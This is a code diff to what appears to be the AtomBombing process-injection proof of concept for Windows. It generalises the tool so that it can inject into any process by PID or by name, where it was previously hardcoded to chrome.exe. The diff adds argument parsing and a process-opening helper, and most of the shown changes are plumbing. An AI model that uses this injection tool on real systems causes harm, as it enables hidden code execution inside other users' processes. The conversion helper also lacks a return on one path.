@@ -1,4 +1,8 @@
+#define NOMINMAX
 #include <stdio.h>
+#include <iostream>
+#include <string>
+#include <limits>
 #include <Windows.h>
 #include <TlHelp32.h>
 #include <winternl.h>
@@ -119,6 +123,28 @@ typedef enum _ESTATUS
 } ESTATUS, *PESTATUS;
 
 #define ESTATUS_FAILED(eStatus) (ESTATUS_SUCCESS != eStatus)
+template<
+    typename T, // T is unsigned digit type
+    typename = std::enable_if_t<!std::is_signed<T>::value && std::is_integral<T>::value>
+>
+T ToUlong(const std::wstring& str)
+{
+    try
+    {
+        size_t idx = 0;
+        unsigned long long val = std::stoull(str, &idx, 0);
+        if (val <= std::numeric_limits<T>::max()&& idx == str.size())
+        {
+            static_assert(sizeof(T) <= sizeof(val), "Invalid size");
+            return static_cast<T>(val);
+        }
+    }
+    catch (const std::exception&)
+    {
+        std::wcout << "Cannot convert string to ulong\n";
+        return 0;
+    }
+}
 
 ESTATUS GetFunctionAddressFromDll(
     PSTR pszDllName,
@@ -209,7 +235,6 @@ ESTATUS main_AddNullTerminatedAtomAndVerifyW(LPWSTR pswzBuffer, ATOM *ptAtom)
     ATOM tAtom = 0;
     ESTATUS eReturn = ESTATUS_INVALID;
     LPWSTR pswzCheckBuffer = NULL;
-    DWORD cbCheckBuffer = 0;
     UINT uiRet = 0;
     HMODULE hUser32 = NULL;
     BOOL bWasAtomWrittenSuccessfully = FALSE;
@@ -956,7 +981,7 @@ lblCleanup:
 
 }
 
-ESTATUS main_GetProcessIdByName(LPWSTR pszProcessName, PDWORD pdwProcessId)
+ESTATUS main_GetProcessIdByName(LPCWSTR pszProcessName, PDWORD pdwProcessId)
 {
     DWORD dwProcessId = 0;
     HANDLE hSnapshot = NULL;
@@ -1009,23 +1034,16 @@ lblCleanup:
 
 }
 
-ESTATUS main_OpenProcessByName(LPWSTR pszProcessName, PHANDLE phProcess)
+ESTATUS main_OpenProcess(DWORD dwPid, PHANDLE phProcess)
 {
     HANDLE hProcess = NULL;
     ESTATUS eReturn = ESTATUS_INVALID;
-    DWORD dwPid = 0;
-
-    eReturn = main_GetProcessIdByName(pszProcessName, &dwPid);
-    if (ESTATUS_FAILED(eReturn))
-    {
-        goto lblCleanup;
-    }
 
     hProcess = OpenProcess(
         PROCESS_ALL_ACCESS,
         FALSE,
         dwPid
-        );
+    );
     if (NULL == hProcess)
     {
         eReturn = ESTATUS_MAIN_OPENPROCESSBYNAME_OPENPROCESS_ERROR;
@@ -1036,6 +1054,24 @@ ESTATUS main_OpenProcessByName(LPWSTR pszProcessName, PHANDLE phProcess)
     printf("[*] Opened process's handle: %d (0x%X).\n\n\n", hProcess, hProcess);
     *phProcess = hProcess;
     eReturn = ESTATUS_SUCCESS;
+
+lblCleanup:
+
+    return eReturn;
+}
+
+ESTATUS main_OpenProcessByName(LPCWSTR pszProcessName, PHANDLE phProcess)
+{
+    ESTATUS eReturn = ESTATUS_INVALID;
+    DWORD dwPid = 0;
+
+    eReturn = main_GetProcessIdByName(pszProcessName, &dwPid);
+    if (ESTATUS_FAILED(eReturn))
+    {
+        goto lblCleanup;
+    }
+
+    eReturn = main_OpenProcess(dwPid, phProcess);
 
 lblCleanup:
 
@@ -1498,7 +1534,6 @@ ESTATUS main_FindAlertableThread(HANDLE hProcess, PHANDLE phAlertableThread)
     DWORD cbProcessThreadsHandlesSize = 0;
     DWORD dwNumberOfProcessThreads = 0;
     BOOL bErr = FALSE;
-    DWORD dwErr = 0;
     HANDLE hAlertableThread = 0;
     PVOID pfnNtWaitForSingleObject = NULL;
     PHANDLE phLocalEvents = NULL;
@@ -1687,9 +1722,47 @@ lblCleanup:
 
 }
 
+void Help()
+{
+    std::wcout << "\nUsage\n"
+        << " --pid=PID                   Inject to process by process Id\n"
+        << " --process-name=name         Inject to process by name\n";
+}
 
+bool ParseCmdArg(const std::wstring& cmdName, const std::wstring& cmd, std::wstring& arg)
+{
+    const auto res = cmd.find(cmdName);
+    if (0 != res)
+    {
+        return false;
+    }
+    arg.assign(cmd.begin() + res + cmdName.size(), cmd.end());
+    return true;
+}
 
-int main()
+bool IsWow64()
+{
+    using PFN_IsWow64Process = BOOL(WINAPI*)(HANDLE, PBOOL);
+
+    static auto pfnIsWow64Process = reinterpret_cast<PFN_IsWow64Process>(GetProcAddress(
+        GetModuleHandleW(L"kernel32"), "IsWow64Process"));
+
+    if (!pfnIsWow64Process)
+    {
+        return false;
+    }
+
+    BOOL isWow64 = FALSE;
+
+    if (!pfnIsWow64Process(GetCurrentProcess(), &isWow64))
+    {
+        std::wcout<<("IsWow64Process failed");
+    }
+
+    return isWow64 != FALSE;
+}
+
+int wmain(int argc, wchar_t* argv[])
 {
     ESTATUS eReturn = ESTATUS_INVALID;
     PVOID pvRemoteShellcodeAddress = NULL;
@@ -1703,13 +1776,49 @@ int main()
     ROPCHAIN tRopChain = { 0 };
     HANDLE hProcess = NULL;
     HANDLE hAlertableThread = NULL;
-    ATOM tAtom = 0;
     printf("[*] ATOM BOMBING\n\n\n");
 
-    eReturn = main_OpenProcessByName(L"chrome.exe", &hProcess);
-    if (ESTATUS_FAILED(eReturn))
+    if (argc > 2)
     {
-        goto lblCleanup;
+        Help();
+        return 1;
+    }
+
+    /*if (IsWow64())
+    {
+        std::wcout << "Please, run 64 bit version of the program\n";
+        return 1;
+    }*/
+
+    const std::wstring cmd = (argc == 2 ? argv[1] : L"");
+    std::wstring arg;
+
+    if (ParseCmdArg(L"--process-name=", cmd, arg))
+    {
+        eReturn = main_OpenProcessByName(arg.c_str(), &hProcess);
+        if (ESTATUS_FAILED(eReturn))
+        {
+            goto lblCleanup;
+        }
+    }
+    else if (ParseCmdArg(L"--pid=", cmd, arg))
+    {
+        DWORD pid = ToUlong<DWORD>(arg);
+        if (0 == pid)
+        {
+            goto lblCleanup;
+        }
+
+        eReturn = main_OpenProcess(pid, &hProcess);
+        if (ESTATUS_FAILED(eReturn))
+        {
+            goto lblCleanup;
+        }
+    }
+    else
+    {
+        Help();
+        return 1;
     }
 
     printf("[*] Searching for an alertable thread.\n\n\n");
